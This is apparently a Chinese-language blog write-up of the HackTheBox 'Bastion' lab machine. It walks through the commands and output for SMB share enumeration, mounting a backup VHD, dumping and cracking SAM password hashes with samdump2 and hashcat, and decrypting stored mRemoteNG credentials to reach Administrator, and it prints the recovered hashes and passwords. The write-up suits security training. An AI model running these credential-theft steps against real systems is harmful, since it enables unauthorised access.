---
title: HackTheBox Bastion 20190813
date: 2019-08-13 10:52:28
tags: [HackTheBox]
categories: [Network Security]
---



1. namp探测
```sh
root@kali2019:~# nmap  10.10.10.134
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-12 21:41 EDT
Nmap scan report for 10.10.10.134
Host is up (0.30s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

```

可以看到目标开启来SMB协议
关于SMB协议：

> SMB(全称是Server Message Block)是一个协议名，可用于在计算机间共享文件、打印机、串口等，电脑上的网上邻居就是靠它实现的。

> SMB 是一种客户机/服务器、请求/响应协议。通过 SMB 协议，客户端应用程序可以在各种网络环境下读、写服务器上的文件，以及对服务器程序提出服务请求。此外通过 SMB 协议，应用程序可以访问远程服务器端的文件、以及打印机等资源。

> NetBIOS 使用下列端口：UDP/137（NetBIOS 名称服务）、UDP/138（NetBIOS 数据报服务）、TCP/139（NetBIOS 会话服务）；SMB 使用下列端口：TCP/139、TCP/445。  #NetBIOS用于局域网内主机名发现。

2. SMB协议连接

Linux下可以通过使用smbclient访问windows共享目录

`yum install samba-client`

列出目标的共享文件夹：
```sh
root@kali2019:~# smbclient -L 10.10.10.134
Enter WORKGROUP\root's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	Backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.134 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available

```

一个个的尝试连接：
```sh
root@kali2019:~# smbclient //10.10.10.134/ADMIN$
Enter WORKGROUP\root's password: 
tree connect failed: NT_STATUS_ACCESS_DENIED

root@kali2019:~# smbclient //10.10.10.134/Backups
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Apr 16 06:02:11 2019
  ..                                  D        0  Tue Apr 16 06:02:11 2019
  note.txt                           AR      116  Tue Apr 16 06:10:09 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 07:43:08 2019
  WindowsImageBackup                  D        0  Fri Feb 22 07:44:02 2019

		7735807 blocks of size 4096. 2793281 blocks available

```

关于smbclient用法：  
```
1，列出某个IP地址所提供的共享文件夹
smbclient -L 198.168.0.1 -U username -W domain (会提示输密码)
smbclient -L 198.168.0.1 -U username%password -W domain

2,像FTP客户端一样使用smbclient
smbclient //192.168.0.1/tmp -U username -W domain (会提示输密码)
smbclient //192.168.0.1/tmp -U username%password -W domain

执行smbclient命令成功后，进入smbclient环境，出现提示符： smb:/>
这里有许多命令和ftp命令相似，如cd 、lcd、get、megt、put、mput等。通过这些命令，我们可以访问远程主机的共享资源。

3,直接一次性使用smbclient命令
smbclient -c "ls" //192.168.0.1/tmp -U username%password
和
smbclient //192.168.0.1/tmp -U username%password
smb:/>ls
功能一样的
```

3. 分析共享目录中的文件

在smbclient中无法读取文件，所以mount到本地

```sh
cd /home 
mkdir Backups 
mount -t cifs -o username=root //10.10.10.134/Backups /home/Backups 
```

查看共享目录目录结构：  
```
root@kali2019:/home/Backups# tree
.
├── note.txt
├── SDT65CB.tmp
└── WindowsImageBackup
    └── L4mpje-PC
        ├── Backup 2019-02-22 124351
        │   ├── 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
        │   ├── 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
        │   ├── BackupSpecs.xml
        │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml
        │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml
        │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml
        │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml
        │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml
        │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml
        │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml
        │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
        │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
        │   └── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml
        ├── Catalog
        │   ├── BackupGlobalCatalog
        │   └── GlobalCatalog
        ├── MediaId
        └── SPPMetadataCache
            └── {cd113385-65ff-4ea2-8ced-5630f6feca8f}

16 directories, 20 files
```

由于vhd文件太大5G，openvpn速度太慢，无法拷贝到本地，尝试guestmount到本地,[参考：Mounting VHD file on Kali Linux through remote share](https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25)

```sh
apt-get install cifs-utils
apt-get install libguestfs-tools
```

```sh
root@kali2019:/mnt# mkdir vhd
root@kali2019:/mnt# guestmount --add '/home/Backups/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd' --inspector --ro /mnt/vhd -v
```


4. 解密SAM文件

```sh
cd /mnt/vhd/Windows/System32/config
cp SAM /root/Documents/HackTheBox/ && cp SYSTEM /root/Documents/HackTheBox/
samdump2 SYSTEM SAM > hashes.txt
cat hashes.txt 
*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
hashcat -m 1000 hashes.txt -a 0 /usr/share/wordlists/rockyou.txt --force
```

可以得到L4mpje的密码,登录即可

`ssh L4mpje@10.10.10.134`


5. 分析目标主机  

查看桌面可以看到user.txt  
查看内容可以得到用户hash

查看`Program Files`和`Program Files （x86）`寻找可以利用的程序漏洞，因为目标安装的软件不多，`mRemoteNG`一眼就能看到，分析其目录，以及对应的Appdata文件夹，可以找到配置文件confCons.xml。

里面的内容别有洞天，Administrator、L4mpje的密码都有，不过是加密的。

寻找解密工具，[github: mRemoteNG-Decrypt](https://github.com/kmahyyg/mremoteng-decrypt)

```sh
python3 mremoteng_decrypt.py  -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
Password: thXLHM96BeKL0ER2

python3 mremoteng_decrypt.py  -s yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB
Password: bureaulampje
```

这样就得到了Administrator密码

使用`ssh administrator@10.10.10.134`，登录，进入桌面可以看到`root.txt`，里面有hash值

